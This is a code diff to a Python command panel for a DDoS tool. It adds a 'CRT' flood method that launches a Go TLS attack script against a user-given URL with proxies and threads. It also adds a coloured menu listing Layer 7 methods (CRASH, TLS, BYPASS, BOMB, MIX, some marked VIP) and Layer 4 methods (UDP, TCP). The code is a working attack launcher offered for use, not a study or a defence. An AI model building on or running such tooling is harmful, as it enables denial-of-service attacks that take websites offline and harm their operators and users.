@@ -65,6 +65,8 @@ def layer7():
 \033[95m           - BOMB [\033[92mURL\033[95m] [\033[92mTHREAD\033[95m] [\033[92mTIME\033[95m]
 \033[95m           - MIX [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRPS\033[95m] [\033[92mTHREADS\033[95m]
 \033[95m           - TLSV2 [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRPS\033[95m] [\033[92mTHREAD\033[95m]
+\033[95m           - CRT [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRATELIMIT\033[95m] [\033[92mproxies.txt\033[95m] [\033[92mTHREADS\033[95m]
+\033[95m           - HENTAI [\033[92mURL\033[95m] [\033[92mTIME\033[95m]
 \033[96m         ╚════════════════════════════════════════════════════════╝
 
 ''')
@@ -187,6 +189,17 @@ def main():
                 print('\n')
                 print('Usage: CRASH <url> METHODS<GET/POST>')
                 print('Example: CRASH http://example.com GET')
+                print('\n')
+
+        elif "CRT" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                os.system(f'go run TLS.go -site {url} -data {method}')
+            except IndexError:
+                print('\n')
+                print('Usage: CRT <url> <time> <ratelimit> <proxies.txt> <threads>')
+                print('Example: CRT http://example.com 244 4 proxies.txt 1500')
                 print('\n')
 
         elif "HENTAI" in cnc:
@@ -372,10 +385,24 @@ def main():
             print('Method "CLOUDFLARE-LAG" not enabled')
 
         elif "help" in cnc:
+            clear()
+            home()
             print(f'''
-LAYER7  ► SHOW LAYER7 METHODS
-LAYER4  ► SHOW LAYER4 METHODS (SOON)
-CLEAR   ► CLEAR TERMINAL
+\033[95m	                  [ \033[92mMENU METHOD & LAYER\033[95m ]
+\033[96m              ╚╦════════════════════════════════════════════╦╝
+\033[96m         ╔═════╩════════════════════════════════════════════╩═════╗
+\033[95m             [\033[94m LAYER - 7\033[95m ]                    [\033[94m LAYER - 4\033[95m ]
+
+\033[95m             • CRASH                          • UDP
+\033[95m             • FXX                            • TCP
+\033[95m             • TLS [\033[92mVIP\033[95m]
+\033[95m             • BYPASS [\033[92mVIP\033[95m]
+\033[95m             • BOMB
+\033[95m             • MIX [\033[92mVIP\033[95m]
+\033[95m             • TLSV2 [\033[92mVIP\033[95m]
+\033[95m             • HENTAI [\033[92mVIP\033[95m]
+\033[96m         ╚════════════════════════════════════════════════════════╝
+
             ''')
 def login():
     user = "user"
